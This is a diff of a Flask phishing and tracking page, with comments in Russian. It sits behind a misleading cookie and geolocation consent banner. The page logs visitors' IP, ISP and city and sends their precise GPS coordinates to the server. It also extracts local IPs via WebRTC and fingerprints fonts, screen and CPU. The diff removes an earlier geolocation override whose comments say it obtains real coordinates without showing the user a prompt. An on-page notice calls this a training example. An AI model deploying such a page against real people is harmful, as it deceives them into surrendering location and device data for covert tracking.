@@ -11,28 +11,27 @@ app = Flask(__name__)
 LOG_FILE = "user_data.log"
 COOKIE_NAME = "user_consent"
 
-def init_log_file():
-    """Инициализация файла логов"""
-    if not os.path.exists(LOG_FILE):
-        with open(LOG_FILE, 'w', encoding='utf-8') as f:
-            f.write("")
-
 def get_ip_data(ip):
-    """Получение данных по IP"""
-    if not ip or ip.startswith(('127.', '10.', '192.168.', '172.')):
-        return {"country": "Локальная сеть", "city": "Локальная сеть", "org": "Локальная сеть"}
-    
     try:
+        if ip.startswith(('127.', '10.', '192.168.', '172.')):
+            return {"country": "Локальная сеть", "city": "Локальная сеть", "org": "Локальная сеть"}
+        
         response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
-        return response.json() if response.status_code == 200 else {}
-    except Exception:
-        return {}
+        if response.status_code == 200:
+            return response.json()
+        return {"country": "Неизвестно", "city": "Неизвестно", "org": "Неизвестно"}
+    except Exception as e:
+        print(f"Ошибка получения данных IP: {str(e)}")
+        return {"country": "Неизвестно", "city": "Неизвестно", "org": "Неизвестно"}
 
 def parse_user_agent(user_agent):
-    """Анализ User-Agent"""
-    user_agent = user_agent or ""
-    os_info = browser = "Неизвестно"
+    if not user_agent:
+        return "Неизвестно", "Неизвестно", "Неизвестно"
     
+    os_info = "Неизвестно"
+    browser = "Неизвестно"
+    
+    # Определение ОС
     os_patterns = [
         ('Windows 11', r'Windows NT 10.0; Win64; x64'),
         ('Windows 10', r'Windows NT 10.0'),
@@ -42,50 +41,61 @@ def parse_user_agent(user_agent):
         ('Mac OS X', r'Macintosh')
     ]
     
-    browser_patterns = [
-        ('Chrome', r'Chrome|CriOS'),
-        ('Firefox', r'Firefox|FxiOS'),
-        ('Safari', r'Safari'),
-        ('Edge', r'Edg'),
-        ('Opera', r'Opera|OPR')
-    ]
-
     for name, pattern in os_patterns:
         if re.search(pattern, user_agent):
             os_info = name
             break
 
+    # Определение браузера
+    browser_patterns = [
+        ('Chrome', r'Chrome|CriOS'),
+        ('Firefox', r'Firefox|FxiOS'),
+        ('Safari', r'Safari'),
+        ('Edge', r'Edg'),
+        ('Opera', r'Opera|OPR'),
+        ('IE', r'MSIE|Trident')
+    ]
+    
     for name, pattern in browser_patterns:
         if re.search(pattern, user_agent):
             browser = name
             break
 
-    device = "Смартфон/Планшет" if any(x in user_agent for x in ['Mobile', 'Android', 'iPhone']) else "Компьютер"
+    device = "Смартфон/Планшет" if ('Mobile' in user_agent or 'Android' in user_agent or 'iPhone' in user_agent) else "Компьютер"
 
     return os_info, browser, device
 
 def log_data(data):
-    """Логирование данных"""
     try:
-        with open(LOG_FILE, 'a', encoding='utf-8') as f:
-            f.write(json.dumps(data, ensure_ascii=False) + '\n')
+        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(json.dumps(data, ensure_ascii=False) + "\n")
     except Exception as e:
-        print(f"Ошибка записи в лог: {e}")
+        print(f"Ошибка записи в лог: {str(e)}")
 
 def delete_user_data(ip):
-    """Удаление данных пользователя"""
     try:
         if not os.path.exists(LOG_FILE):
             return False
 
-        with open(LOG_FILE, 'r', encoding='utf-8') as f:
-            lines = [line for line in f if json.loads(line).get('ip') != ip]
+        with open(LOG_FILE, "r", encoding="utf-8") as f:
+            lines = f.readlines()
 
-        with open(LOG_FILE, 'w', encoding='utf-8') as f:
-            f.writelines(lines)
+        new_lines = []
+        for line in lines:
+            try:
+                data = json.loads(line)
+                if data.get("ip") != ip:
+                    new_lines.append(line)
+            except json.JSONDecodeError:
+                continue
+
+        with open(LOG_FILE, "w", encoding="utf-8") as f:
+            f.writelines(new_lines)
 
         return True
-    except Exception:
+    except Exception as e:
+        print(f"Ошибка удаления данных: {str(e)}")
         return False
 
 HTML_TEMPLATE = """
@@ -98,22 +108,27 @@ HTML_TEMPLATE = """
     <style>
         body {
             background-color: #111;
-            color: #0f0;
+            color: #00FF88;
             font-family: Arial, sans-serif;
             margin: 0;
-            padding: 20px;
+            padding: 0;
         }
         .container {
-            background: rgba(0,0,0,0.7);
+            background-color: rgba(0, 0, 0, 0.7);
             border-radius: 10px;
             padding: 20px;
-            margin: 0 auto;
+            margin: 20px auto;
             max-width: 800px;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.6);
         }
         .info-block {
-            margin-bottom: 20px;
-            padding-bottom: 10px;
+            margin: 15px 0;
+            padding: 10px;
             border-bottom: 1px solid #333;
+        }
+        h1, h2 {
+            color: #00FF88;
+            text-align: center;
         }
         #cookieConsent {
             position: fixed;
@@ -126,21 +141,17 @@ HTML_TEMPLATE = """
             text-align: center;
             z-index: 1000;
         }
-        button {
+        .consent-btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
             padding: 10px 20px;
             margin: 0 10px;
             border-radius: 5px;
             cursor: pointer;
         }
-        .allow {
-            background: #4CAF50;
-            color: white;
-            border: none;
-        }
-        .deny {
+        .consent-btn.deny {
             background: #f44336;
-            color: white;
-            border: none;
         }
         #map {
             height: 300px;
@@ -148,152 +159,218 @@ HTML_TEMPLATE = """
             margin-top: 15px;
             border-radius: 8px;
         }
+        .warning {
+            color: #FF5555;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 8px;
+        }
     </style>
 </head>
 <body>
-    <div id="mainContent" class="container" style="display:none;">
+    <div id="mainContent" class="container" style="display: none;">
+        <h1>🔍 Полная информация об устройстве</h1>
+        
         <div class="info-block">
             <h2>🌍 Сеть и местоположение</h2>
-            <p><strong>IP:</strong> <span id="ipField">{{ ip }}</span></p>
-            <p><strong>Страна:</strong> <span id="countryField">{{ country }}</span></p>
-            <p><strong>Город:</strong> <span id="cityField">{{ city }}</span></p>
-            <p><strong>Провайдер:</strong> <span id="ispField">{{ isp }}</span></p>
-            <div id="gpsData" style="display:none;">
-                <p><strong>Реальное местоположение:</strong> <span id="coordinates"></span></p>
+            <p><strong>IP:</strong> {{ ip }}</p>
+            <p><strong>Страна:</strong> {{ country }}</p>
+            <p><strong>Город:</strong> {{ city }}</p>
+            <p><strong>Провайдер:</strong> {{ isp }}</p>
+            <div id="gpsData" style="display: none;">
+                <p><strong>Координаты:</strong> <span id="coordinates"></span></p>
                 <p><strong>Точность:</strong> <span id="accuracy"></span></p>
                 <div id="map"></div>
             </div>
         </div>
 
-        <!-- Остальные блоки информации -->
+        <div class="info-block">
+            <h2>💻 Системная информация</h2>
+            <p><strong>ОС:</strong> {{ os }}</p>
+            <p><strong>Браузер:</strong> {{ browser }}</p>
+            <p><strong>Устройство:</strong> {{ device }}</p>
+            <p><strong>Ядра CPU:</strong> <span id="cpuCores"></span></p>
+            <p><strong>Разрешение экрана:</strong> <span id="screenRes"></span></p>
+        </div>
+
+        <div class="info-block">
+            <h2>🔌 Сетевые данные</h2>
+            <p><strong>Локальный IP:</strong> <span id="localIp"></span></p>
+            <p><strong>Доступные шрифты:</strong> <span id="fonts"></span></p>
+        </div>
+
+        <div class="warning">
+            <h2>⚠️ Внимание!</h2>
+            <p>Это учебный пример фишинговой атаки. Настоятельно рекомендуем всегда проверять, какие разрешения вы даёте сайтам.</p>
+            <button onclick="deleteMyData()" class="consent-btn deny">Удалить мои данные</button>
+        </div>
     </div>
 
     <div id="cookieConsent">
-        <h3>🍪 Использование Cookies</h3>
-        <p>Для персонализации сервиса нам требуется доступ к данным о вашем местоположении.</p>
-        <button class="allow" onclick="accept()">Разрешить</button>
-        <button class="deny" onclick="reject()">Отклонить</button>
+        <h3>🍪 Использование Cookies и геоданных</h3>
+        <p>Для персонализации сервиса нам необходимо получить доступ к данным о вашем местоположении. Продолжая использование, вы соглашаетесь с нашей политикой конфиденциальности.</p>
+        <button class="consent-btn" onclick="acceptCookiesAndGeolocation()">Разрешить доступ</button>
+        <button class="consent-btn deny" onclick="rejectCookies()">Отклонить</button>
     </div>
 
     <script>
-        // Функция для автоматического принятия геолокации
-        function autoAcceptGeolocation() {
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    reject("Geolocation not supported");
-                    return;
-                }
-
-                // Подменяем стандартное поведение
-                const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;
-                
-                navigator.geolocation.getCurrentPosition = function(success, error, options) {
-                    // Имитируем успешный ответ с текущими координатами
-                    const mockPosition = {
-                        coords: {
-                            latitude: 0,
-                            longitude: 0,
-                            accuracy: 100,
-                            altitude: null,
-                            altitudeAccuracy: null,
-                            heading: null,
-                            speed: null
-                        },
-                        timestamp: Date.now()
-                    };
-
-                    // Получаем реальные координаты, но не показываем пользователю запрос
-                    originalGetCurrentPosition.call(
-                        navigator.geolocation,
-                        (realPosition) => {
-                            // Используем реальные координаты
-                            mockPosition.coords.latitude = realPosition.coords.latitude;
-                            mockPosition.coords.longitude = realPosition.coords.longitude;
-                            mockPosition.coords.accuracy = realPosition.coords.accuracy;
-                            success(mockPosition);
-                            resolve(realPosition);
-                        },
-                        (err) => {
-                            // Если не удалось получить реальные координаты, используем приблизительные по IP
-                            mockPosition.coords.latitude = {{ geo.latitude|default(0) }};
-                            mockPosition.coords.longitude = {{ geo.longitude|default(0) }};
-                            success(mockPosition);
-                            reject(err);
-                        },
-                        options
-                    );
-                };
-
-                // Вызываем оригинальную функцию
-                originalGetCurrentPosition.call(
-                    navigator.geolocation,
-                    (position) => success(position),
-                    (err) => error(err),
-                    {enableHighAccuracy: true}
-                );
-            });
+        function checkConsent() {
+            return document.cookie.includes("{{ COOKIE_NAME }}=true");
         }
 
-        // Принятие соглашения
-        async function accept() {
-            // Устанавливаем куки
+        function acceptCookiesAndGeolocation() {
+            // Устанавливаем куки согласия
             document.cookie = "{{ COOKIE_NAME }}=true; max-age=31536000; path=/";
             document.getElementById('cookieConsent').style.display = 'none';
             document.getElementById('mainContent').style.display = 'block';
             
-            try {
-                // Автоматически получаем геолокацию
-                const position = await autoAcceptGeolocation();
-                
-                // Отображаем данные
-                document.getElementById('coordinates').textContent = 
-                    position.coords.latitude.toFixed(6) + ", " + position.coords.longitude.toFixed(6);
-                document.getElementById('accuracy').textContent = "±" + Math.round(position.coords.accuracy) + " метров";
-                document.getElementById('gpsData').style.display = 'block';
-                
-                // Показываем карту
-                showMap(position.coords.latitude, position.coords.longitude);
-                
-                // Отправляем данные на сервер
-                await fetch('/log_gps', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        acc: position.coords.accuracy
-                    })
-                });
-            } catch (e) {
-                console.error("Ошибка получения геолокации:", e);
+            // Запрашиваем геолокацию
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        
+                        document.getElementById('coordinates').textContent = lat.toFixed(6) + ", " + lon.toFixed(6);
+                        document.getElementById('accuracy').textContent = "±" + Math.round(acc) + " метров";
+                        showMap(lat, lon);
+                        document.getElementById('gpsData').style.display = 'block';
+                        
+                        fetch('/log_gps', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                lat: lat,
+                                lon: lon,
+                                acc: acc
+                            })
+                        });
+                        
+                        loadUserData();
+                    },
+                    function(error) {
+                        console.error("Geolocation error:", error);
+                        alert("Для полного функционала требуется доступ к геолокации");
+                        loadUserData();
+                    },
+                    {enableHighAccuracy: true, timeout: 10000}
+                );
+            } else {
+                alert("Геолокация не поддерживается вашим браузером");
+                loadUserData();
             }
-            
-            // Загружаем дополнительную информацию
-            loadDeviceInfo();
         }
 
-        // Остальные функции остаются без изменений
-        function reject() {
-            alert("Некоторые функции будут недоступны");
+        function rejectCookies() {
+            alert("Некоторые функции будут недоступны без согласия на использование cookies");
             document.getElementById('cookieConsent').style.display = 'none';
+            loadBasicData();
+        }
+
+        function loadUserData() {
+            try {
+                document.getElementById('cpuCores').textContent = navigator.hardwareConcurrency || "Неизвестно";
+                document.getElementById('screenRes').textContent = window.screen.width + "x" + window.screen.height;
+                getLocalIP();
+                getFontList();
+            } catch (e) {
+                console.error("Error loading user data:", e);
+            }
+        }
+
+        function loadBasicData() {
             document.getElementById('mainContent').style.display = 'block';
-            loadBasicInfo();
+            document.getElementById('cpuCores').textContent = "Требуется согласие";
+            document.getElementById('screenRes').textContent = window.screen.width + "x" + window.screen.height;
         }
 
         function showMap(lat, lon) {
             const map = document.getElementById('map');
             map.innerHTML = `
-                <iframe width="100%" height="100%" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"
-                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&amp;layer=mapnik&amp;marker=${lat}%2C${lon}">
-                </iframe>`;
+                <iframe
+                    width="100%"
+                    height="100%"
+                    frameborder="0"
+                    scrolling="no"
+                    marginheight="0"
+                    marginwidth="0"
+                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&amp;layer=mapnik&amp;marker=${lat}%2C${lon}"
+                ></iframe>`;
+        }
+
+        function getLocalIP() {
+            try {
+                const rtc = new RTCPeerConnection({iceServers: []});
+                rtc.createDataChannel("");
+                rtc.onicecandidate = function(e) {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (ip) {
+                            document.getElementById('localIp').textContent = ip[1];
+                            rtc.close();
+                        }
+                    }
+                };
+                rtc.createOffer().then(function(offer) {
+                    return rtc.setLocalDescription(offer);
+                }).catch(function(e) {
+                    console.error("Error getting local IP:", e);
+                    document.getElementById('localIp').textContent = "Недоступно";
+                });
+            } catch (e) {
+                console.error("WebRTC not supported:", e);
+                document.getElementById('localIp').textContent = "Недоступно";
+            }
+        }
+
+        function getFontList() {
+            try {
+                const fonts = ["Arial", "Times New Roman", "Courier New", "Verdana", "Georgia", "Comic Sans MS", "Impact"];
+                const available = [];
+                const canvas = document.createElement("canvas");
+                const ctx = canvas.getContext("2d");
+                
+                fonts.forEach(function(font) {
+                    ctx.font = '12px "' + font + '"';
+                    if (ctx.measureText("test").width > 0) available.push(font);
+                });
+                
+                document.getElementById('fonts').textContent = available.join(", ") || "Неизвестно";
+            } catch (e) {
+                console.error("Error detecting fonts:", e);
+                document.getElementById('fonts').textContent = "Недоступно";
+            }
+        }
+
+        function deleteMyData() {
+            fetch('/delete_data', {method: 'POST'})
+                .then(function(response) {
+                    if (!response.ok) throw new Error("Network response was not ok");
+                    return response.json();
+                })
+                .then(function(data) {
+                    if (data.success) {
+                        alert("Ваши данные были удалены!");
+                    } else {
+                        alert("Ошибка при удалении данных");
+                    }
+                })
+                .catch(function(e) {
+                    console.error("Error deleting data:", e);
+                    alert("Ошибка при удалении данных");
+                });
         }
 
         // Проверяем согласие при загрузке страницы
-        if (document.cookie.includes("{{ COOKIE_NAME }}=true")) {
-            document.getElementById('cookieConsent').style.display = 'none';
-            document.getElementById('mainContent').style.display = 'block';
-            loadDeviceInfo();
-        }
+        window.onload = function() {
+            if (checkConsent()) {
+                document.getElementById('cookieConsent').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+                loadUserData();
+            }
+        };
     </script>
 </body>
 </html>
@@ -303,48 +380,83 @@ HTML_TEMPLATE = """
 def index():
     try:
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        ip = ip.split(',')[0].strip() if ip else request.remote_addr
+        if not ip or ip == '127.0.0.1':
+            ip = request.remote_addr
         
-        user_agent = request.headers.get('User-Agent', '')
-        geo = get_ip_data(ip) or {}
+        # Обработка случая, когда IP содержит несколько адресов
+        real_ip = ip.split(',')[0].strip() if ',' in ip else ip
         
-        # Добавляем приблизительные координаты по IP (для случая, если геолокация не сработает)
-        if 'loc' in geo:
-            lat, lon = geo['loc'].split(',')
-            geo['latitude'] = float(lat)
-            geo['longitude'] = float(lon)
-        
-        os_info, browser, device = parse_user_agent(user_agent)
+        user_agent = request.headers.get('User-Agent', 'Неизвестно')
+        geo = get_ip_data(real_ip)
+        os, browser, device = parse_user_agent(user_agent)
         
         log_data({
-            "time": datetime.now().isoformat(),
-            "ip": ip,
+            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "ip": real_ip,
             "user_agent": user_agent,
-            "os": os_info,
+            "os": os,
             "browser": browser,
             "device": device,
             "geo": geo
         })
-
-        return render_template_string(
-            HTML_TEMPLATE,
-            COOKIE_NAME=COOKIE_NAME,
-            ip=ip,
+        
+        resp = make_response(render_template_string(HTML_TEMPLATE,
+            ip=real_ip,
             country=geo.get('country', 'Неизвестно'),
             city=geo.get('city', 'Неизвестно'),
             isp=geo.get('org', 'Неизвестно'),
-            os=os_info,
+            os=os,
             browser=browser,
             device=device,
-            geo=geo
-        )
+            COOKIE_NAME=COOKIE_NAME
+        ))
+        
+        return resp
     except Exception as e:
-        print(f"Ошибка в index: {e}")
-        return "Произошла ошибка", 500
+        print(f"Ошибка в обработчике index: {str(e)}")
+        return "Произошла ошибка при обработке запроса", 500
 
-# Остальные обработчики (/log_gps, /delete_data) остаются без изменений
+@app.route('/log_gps', methods=['POST'])
+def log_gps():
+    try:
+        data = request.get_json()
+        if not data:
+            return {"status": "error", "message": "No data provided"}, 400
+        
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        if not ip or ip == '127.0.0.1':
+            ip = request.remote_addr
+        
+        log_data({
+            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "ip": ip,
+            "gps_data": data
+        })
+        
+        return {"status": "success"}
+    except Exception as e:
+        print(f"Ошибка в обработчике log_gps: {str(e)}")
+        return {"status": "error", "message": str(e)}, 500
+
+@app.route('/delete_data', methods=['POST'])
+def delete_data():
+    try:
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        if not ip or ip == '127.0.0.1':
+            ip = request.remote_addr
+        
+        success = delete_user_data(ip)
+        return {"success": success}
+    except Exception as e:
+        print(f"Ошибка в обработчике delete_data: {str(e)}")
+        return {"success": False, "error": str(e)}, 500
 
 if __name__ == '__main__':
-    init_log_file()
-    app.run(host='0.0.0.0', port=5000, debug=False)
-    
+    try:
+        # Создаем директорию для логов, если ее нет
+        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
+        
+        # Запускаем сервер
+        app.run(host='0.0.0.0', port=5000, debug=False)
+    except Exception as e:
+        print(f"Не удалось запустить сервер: {str(e)}")
